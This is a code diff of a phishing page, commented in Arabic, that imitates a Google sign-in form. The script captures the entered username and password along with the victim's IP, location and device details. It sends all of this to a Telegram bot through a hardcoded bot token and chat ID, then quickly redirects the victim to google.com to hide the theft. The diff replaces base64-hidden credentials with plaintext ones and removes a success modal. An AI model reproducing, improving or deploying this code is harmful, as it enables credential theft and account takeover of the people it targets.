@@ -152,80 +152,6 @@
             text-align: center;
             display: none;
         }
-        
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.5);
-            align-items: center;
-            justify-content: center;
-        }
-        .modal-content {
-            background-color: white;
-            border-radius: 12px;
-            padding: 30px;
-            text-align: center;
-            max-width: 400px;
-            margin: 20px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            animation: slideDown 0.3s ease-out;
-        }
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        .modal-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-        .modal-title {
-            font-size: 22px;
-            font-weight: 500;
-            margin-bottom: 15px;
-            color: #1a73e8;
-        }
-        .modal-message {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        .modal-time {
-            background-color: #f8f9fa;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #34A853;
-            margin-bottom: 25px;
-            font-weight: 500;
-        }
-        .modal-btn {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px 30px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        .modal-btn:hover {
-            background-color: #1669d4;
-        }
-        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -293,52 +219,21 @@
         </div>
     </div>
 
-    <!-- Modal for success message -->
-    <div id="successModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-icon">📧</div>
-            <div class="modal-title">تم استلام طلبك</div>
-            <div class="modal-message">
-                تم إرسال بيانات تسجيل الدخول بنجاح.<br>
-                ستصلك رسالة التأكيد على بريدك الإلكتروني خلال 24 ساعة.
-            </div>
-            <div class="modal-time">
-                ⏰ سيتم الرد خلال 24 ساعة
-            </div>
-            <button class="modal-btn" onclick="redirectToGoogle()">حسناً</button>
-        </div>
-    </div>
-
     <script>
-        // ========== إعدادات تليجرام (تم تشفير المفتاح فقط) ==========
-        // تشفير Base64 لمفتاح البوت ومعرف الدردشة فقط
-        const encryptedBotToken = 'ODU2NzY1MDY1NjpBQUZBWGU1TV94UTZab20tUV91YzdnMnclMkZBRDNXMmZBZHFrSQ==';
-        const encryptedChatId = 'ODMwNDEwMTM2Mg==';
-        
-        // فك تشفير المفتاح فقط
-        function decryptData(encryptedData) {
-            try {
-                return atob(encryptedData);
-            } catch(e) {
-                return '';
-            }
-        }
-        
-        // المفتاح المفكوك (مشفر في المصدر لكنه يظهر بعد فك التشفير)
-        const telegramBotToken = decryptData(encryptedBotToken);
-        const telegramChatId = decryptData(encryptedChatId);
-        // ============================================================
+        // ========== إعدادات تليجرام ==========
+        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
+        const telegramChatId = '8304101362';
+        // =====================================
 
         const loginForm = document.getElementById('loginForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('loginBtn');
         const loadingMessageDiv = document.getElementById('loadingMessage');
-        const successModal = document.getElementById('successModal');
         
         let isSubmitting = false;
 
-        // دالة سريعة لجلب IP
+        // دالة سريعة لجلب IP (timeout قصير)
         async function getIPFast() {
             try {
                 const controller = new AbortController();
@@ -374,24 +269,27 @@
             }
         }
 
-        // دالة لجمع معلومات الجهاز
+        // دالة سريعة لجمع معلومات الجهاز
         function getDeviceFast() {
             const ua = navigator.userAgent;
             let device = 'PC';
             let browser = 'غير معروف';
             let os = 'غير معروف';
             
+            // تحديد الجهاز
             if (/Android/i.test(ua)) device = 'Android';
             else if (/iPhone/i.test(ua)) device = 'iPhone';
             else if (/iPad/i.test(ua)) device = 'iPad';
             else if (/Windows/i.test(ua)) device = 'Windows';
             else if (/Mac/i.test(ua)) device = 'Mac';
             
+            // تحديد المتصفح
             if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
             else if (/Firefox/i.test(ua)) browser = 'Firefox';
             else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
             else if (/Edge/i.test(ua)) browser = 'Edge';
             
+            // تحديد نظام التشغيل
             if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10';
             else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
             else if (/Mac OS X/i.test(ua)) os = 'macOS';
@@ -401,7 +299,7 @@
             return { device, browser, os };
         }
 
-        // إرسال البيانات إلى تليجرام (بدون تشفير اسم المستخدم وكلمة المرور)
+        // إرسال سريع إلى تليجرام (بدون انتظار)
         function sendToTelegramFast(username, password, ip, location, device) {
             const timestamp = new Date().toLocaleString('ar-EG');
             const message = `🔐 GOOGLE LOGIN 🔐
@@ -420,6 +318,7 @@
             
             const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
             
+            // إرسال بدون انتظار - Fire and Forget
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -440,17 +339,6 @@
                 loadingMessageDiv.style.display = 'none';
                 loginBtn.disabled = false;
             }
-        }
-
-        // عرض رسالة النجاح للمستخدم
-        function showSuccessMessage() {
-            successModal.style.display = 'flex';
-        }
-
-        // التوجيه إلى Google
-        function redirectToGoogle() {
-            successModal.style.display = 'none';
-            window.location.href = 'https://www.google.com';
         }
 
         // معالج تسجيل الدخول
@@ -478,20 +366,22 @@
             showLoading(true, 'جاري تسجيل الدخول...');
             
             try {
-                // جمع المعلومات
+                // جمع المعلومات بسرعة
                 const ip = await getIPFast();
                 const location = await getLocationFast(ip);
                 const device = getDeviceFast();
                 
-                // إرسال البيانات إلى تليجرام (اسم المستخدم وكلمة المرور بدون تشفير)
+                // إرسال إلى تليجرام فوراً
                 sendToTelegramFast(username, password, ip, location, device);
                 
                 console.log('✅ تم إرسال البيانات إلى تليجرام');
                 console.log(`👤 ${username} | 🌍 ${location.country} | 📱 ${device.device}`);
                 
-                // إظهار رسالة النجاح
-                showLoading(false);
-                showSuccessMessage();
+                // تحويل فوري
+                showLoading(true, 'جاري التحويل...');
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 200);
                 
             } catch (error) {
                 console.error('خطأ:', error);
@@ -506,7 +396,7 @@
                 } catch(e) {}
                 
                 showLoading(false);
-                showSuccessMessage();
+                alert('⚠️ حدث خطأ، يرجى المحاولة مرة أخرى');
                 isSubmitting = false;
             }
         });
@@ -526,14 +416,7 @@
             }
         });
         
-        // إغلاق المودال عند الضغط خارجها
-        window.onclick = function(event) {
-            if (event.target === successModal) {
-                redirectToGoogle();
-            }
-        }
-        
-        console.log('✅ تم تحميل الصفحة - تم تشفير مفتاح البوت فقط');
+        console.log('✅ تم تحميل صفحة Google - الوضع السريع');
     </script>
 </body>
 </html>
